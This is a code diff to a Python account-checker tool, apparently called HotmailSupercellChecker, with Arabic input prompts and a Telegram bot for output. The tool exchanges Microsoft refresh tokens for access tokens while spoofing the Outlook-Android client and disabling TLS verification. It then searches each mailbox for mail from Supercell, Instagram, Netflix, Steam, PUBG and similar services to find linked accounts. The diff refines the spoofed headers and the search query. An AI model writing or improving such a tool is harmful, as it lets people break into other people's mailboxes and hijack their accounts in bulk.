@@ -76,14 +76,8 @@ G = '\033[1;32m'    # أخضر
 B = '\033[1;34m'    # أزرق
 W = '\033[1;37m'
 
-# Check if arguments are provided, otherwise ask for input
-if len(sys.argv) > 1:
-    TOKEN = input('توكن : ').strip()
-    CI = input('ايدي : ').strip()
-    TB = telebot.TeleBot(TOKEN)
-else:
-    TB = telebot.TeleBot(input('توكن : ').strip())
-    CI = input('ايدي : ').strip()
+TB = telebot.TeleBot(input('توكن : ').strip())
+CI = input('ايدي : ').strip()
 
 SV={"noreply@id.supercell.com":"Supercell","security@mail.instagram.com":"Instagram","security@facebookmail.com":"Facebook","register@account.tiktok.com":"TikTok","info@x.com":"X (Twitter)","info@account.netflix.com":"Netflix","noreply@crunchyroll.com":"Crunchyroll","noreply@steampowered.com":"Steam","xboxreps@engage.xbox.com":"Xbox","help@acct.epicgames.com":"Epic Games","noreply@accts.krafton.com":"PUBG Mobile","yallaludo_account@support.yalla.live":"YALLA LUDO","service@mail.yallapay.live":"YALLA PAY"}
 
@@ -174,7 +168,7 @@ class HotmailSupercellChecker:
      return"BAD"
     token_url="https://login.live.com/oauth20_token.srf"
     token_payload={'grant_type':'refresh_token','client_id':'0000000048170EF2','scope':'https://substrate.office.com/User-Internal.ReadWrite','redirect_uri':'https://login.live.com/oauth20_desktop.srf','refresh_token':refresh_token,'uaid':'db28da170f2a4b85a26388d0a6cdbb6e'}
-    token_headers={'User-Agent':'Outlook-Android/2.0','Content-Type':'application/x-www-form-urlencoded','Host':'login.live.com','Connection':'Keep-Alive'}
+    token_headers={'x-ms-sso-Ignore-SSO':'1','User-Agent':'Outlook-Android/2.0','Content-Type':'application/x-www-form-urlencoded','Content-Length':'547','Host':'login.live.com','Connection':'Keep-Alive','Accept-Encoding':'gzip'}
     try:
      token_response=requests.post(token_url,data=token_payload,headers=token_headers,timeout=30,verify=False)
     except:
@@ -192,11 +186,11 @@ class HotmailSupercellChecker:
       with self.lock:
        self.bad+=1
       return"BAD"
-     outlook_headers={'User-Agent':'Outlook-Android/2.0','Authorization':f'Bearer {access_token}','X-AnchorMailbox':f'CID:{refresh_token}','Content-Type':'application/json'}
+     outlook_headers={'User-Agent':'Outlook-Android/2.0','Pragma':'no-cache','Accept':'application/json','ForceSync':'false','Authorization':f'Bearer {access_token}','X-AnchorMailbox':f'CID:{refresh_token}','Host':'substrate.office.com','Connection':'Keep-Alive','Accept-Encoding':'gzip'}
      found_links=[]
      for email,service in SV.items():
       search_url="https://outlook.live.com/search/api/v2/query?n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124"
-      search_payload={"Scenario":{"Name":"owa.react"},"EntityRequests":[{"EntityType":"Conversation","ContentSources":["Exchange"],"Query":{"QueryString":f"from:{email}"},"Size":5}]}
+      search_payload={"Cvid":"7ef2720e-6e59-ee2b-a217-3a4f427ab0f7","Scenario":{"Name":"owa.react"},"TimeZone":"Egypt Standard Time","TextDecorations":"Off","EntityRequests":[{"EntityType":"Conversation","ContentSources":["Exchange"],"Filter":{"Or":[{"Term":{"DistinguishedFolderName":"msgfolderroot"}},{"Term":{"DistinguishedFolderName":"DeletedItems"}}]},"From":0,"Query":{"QueryString":email},"RefiningQueries":None,"Size":25,"Sort":[{"Field":"Score","SortDirection":"Desc","Count":3},{"Field":"Time","SortDirection":"Desc"}],"EnableTopResults":True,"TopResultsCount":3}],"AnswerEntityRequests":[{"Query":{"QueryString":email},"EntityTypes":["Event","File"],"From":0,"Size":10,"EnableAsyncResolution":True}],"QueryAlterationOptions":{"EnableSuggestion":True,"EnableAlteration":True,"SupportedRecourseDisplayTypes":["Suggestion","NoResultModification","NoResultFolderRefinerModification","NoRequeryModification","Modification"]},"LogicalId":"446c567a-02d9-b739-b9ca-616e0d45905c"}
       try:
        search_response=requests.post(search_url,json=search_payload,headers=outlook_headers,timeout=30,verify=False)
        if search_response.status_code==200:
@@ -206,6 +200,15 @@ class HotmailSupercellChecker:
          entity_data=search_data['EntityRequests'][0]
          if'Total'in entity_data:
           total_msgs=int(entity_data['Total'])
+        search_text=json.dumps(search_data)
+        if'"Total":'in search_text:
+         try:
+          start=search_text.find('"Total":')+len('"Total":')
+          end=search_text.find(',',start)
+          total_str=search_text[start:end].strip()
+          total_msgs=int(total_str)
+         except:
+          pass
         if total_msgs>0:
          found_links.append(service)
       except:
